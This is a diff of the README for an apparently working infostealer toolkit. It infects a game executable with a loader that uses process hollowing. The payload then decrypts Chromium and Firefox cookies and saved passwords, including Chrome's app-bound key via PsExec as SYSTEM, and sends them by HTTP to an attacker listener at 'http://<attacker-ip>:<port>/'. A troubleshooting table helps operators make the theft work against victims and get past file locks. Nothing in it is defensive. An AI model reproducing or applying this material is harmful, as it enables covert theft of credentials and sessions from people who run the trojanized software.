+This works on Vivaldi, Chrome, Edge, and Brave while the browser is running -- no need to close it.
 
 The copied database (and its `-wal`/`-shm` companions) go to `%TEMP%\ck_db.tmp` before being
 opened read-only with SQLite.
 
 ### `auto.py --run` local test flow
 
-1. Backup original .exe to `.orig` (standalone mode only; folder mode skips this — the
+1. Backup original .exe to `.orig` (standalone mode only; folder mode skips this -- the
    loader's rename-restore handles it).
 2. Copy infected exe over original (standalone) or run directly from `ifec/folds/` (folder).
-3. Execute — the loader opens the game, does process hollowing, runs the payload.
+3. Execute -- the loader opens the game, does process hollowing, runs the payload.
 4. Wait 10s (game opens + payload starts).
 5. Kill the loader process.
 6. Wait 25s (payload extraction + HTTP exfiltration).
 7. Kill the game by exe name (`taskkill /F /IM`).
 8. Kill orphaned hollowed `cmd.exe` by `ParentProcessId` (PowerShell, targeted).
 9. Restore original .exe (standalone mode only, 5 retries with 3s intervals).
-10. Wait for cookies in `loot/cookies.json` (5 min timeout).
+10. Wait for cookies in `loot/all_cookies.json` (5 min timeout).
 
 ---
 
@@ -772,7 +830,7 @@ opened read-only with SQLite.
 
 - **Windows 10/11 x64**
 - **Python 3.8+** (tested with 3.14)
-- **MSVC (`cl.exe`)** — Visual Studio 2022 Build Tools, C++ workload — only needed to compile
+- **MSVC (`cl.exe`)** -- Visual Studio 2022 Build Tools, C++ workload -- only needed to compile
   the payload (`build.bat`). The legacy Python extractors and listener need no compiler.
 - **Python deps:**
 
@@ -782,7 +840,7 @@ opened read-only with SQLite.
 
   Installs `cryptography` (DPAPI / AES-GCM for `cookielog.py`) and `websocket-client` (CDP,
   used by the legacy live mode).
-- **PsExec64.exe** — included under `tools/`. Only needed for the Chrome >=127 v20 app-bound
+- **PsExec64.exe** -- included under `tools/`. Only needed for the Chrome >=127 v20 app-bound
   key extraction (`cookielog.py --v20-sys`).
 
 ---
@@ -791,15 +849,15 @@ opened read-only with SQLite.
 
 | Symptom | Cause | Fix |
 |---|---|---|
-| `connect failed: 10061` in debug.log | Listener not up or wrong port — `listen.py` was slow to start (getfqdn DNS delay) | Fixed in current `listen.py` (server_bind override). Ensure `listen.py` is running before the victim executes |
+| `connect failed: 10061` in debug.log | Listener not up or wrong port -- `listen.py` was slow to start (getfqdn DNS delay) | Fixed in current `listen.py` (server_bind override). Ensure `listen.py` is running before the victim executes |
 | `WinError 32` restoring original .exe after `--run` | Game process holds the file lock | Fixed in current `auto.py` (kills game by name + targeted cmd.exe by PID). Close the game manually if retries fail |
 | Unity "Error" window on the host | Host was extracted as `~ck_tmp.exe`, so Unity looked for `~ck_tmp_Data/` | Rename-restore (default) preserves the original exe name; ensure the rename to `~ck_bak.bin` isn't blocked by AV |
-| WinHTTP error `12029` | WinHTTP/WinINet fail inside a hollowed process (proxy config unavailable) | The payload uses Winsock2, not WinHTTP — rebuild `ckdll.dll` if you hit this (current code already uses Winsock2) |
+| WinHTTP error `12029` | WinHTTP/WinINet fail inside a hollowed process (proxy config unavailable) | The payload uses Winsock2, not WinHTTP -- rebuild `ckdll.dll` if you hit this (current code already uses Winsock2) |
 | `loader: base 0x5F000000 occupied` | Another process already mapped the payload's fixed base address | Use a different host `.exe`, or reboot / close the conflicting process |
 | Cookies not received by listener | `listen.py` not running, wrong C2 URL, or firewall blocking the port | Confirm `listen.py` is up, the C2 URL matches `http://<attacker-ip>:<port>/`, and the port is open in the firewall |
 | No Chromium cookies decrypted | Chrome >=127 uses the app-bound v20 key, which isn't present | Run `cookielog.py --v20-sys` (as SYSTEM via PsExec) then `--v20-usr` to generate `v20.key`, then re-extract |
-| `DumpChromium: copy failed (browser running?)` | Browser holds a lock on the cookie DB and `CopyFileShared` failed (error 32 = sharing violation) | Close the browser before running the payload (Vivaldi always fails while running), or rely on Firefox cookies (Firefox doesn't lock) |
-| Invalid JSON at listener (`Invalid control character at: line 1 column 73`) | Old payload used raw `Put()` (no escaping) for password values — binary chars in decrypted passwords break JSON | Fixed in current build (`Put()` replaced with `PutJ()`). Rebuild with `build.bat` |
+| `DumpChromium: copy failed (browser running?)` | Browser holds a 0-sharing lock on the cookie DB (`CopyFileShared` failed, error 32) | The payload falls back to handle hijacking automatically. If hijack also fails, the browser may not have the DB open -- close and reopen it, or check `debug.log` for `HijackCookieDB` messages |
+| Invalid JSON at listener (`Invalid control character at: line 1 column 73`) | Old payload used raw `Put()` (no escaping) for password values -- binary chars in decrypted passwords break JSON | Fixed in current build (`Put()` replaced with `PutJ()`). Rebuild with `build.bat` |
 | DPAPI failed (`CryptUnprotectData` returns false) | Running as a different user than the profile owner | Run the extraction in the target user's context (DPAPI keys are per-user) |
 | `[-] no MSVC` during build | Visual Studio C++ Build Tools not installed | Install VS 2022 Build Tools with the C++ workload and run from a Developer Command Prompt |
 | No cookies in `loot/` after local test | Payload fell back to `drop.json` because no C2 and `sink.py` wasn't running | Either set a C2 URL + run `listen.py`, or run `sink.py` for pipe mode; check `C:\ProgramData\cookielog\drop.json` |
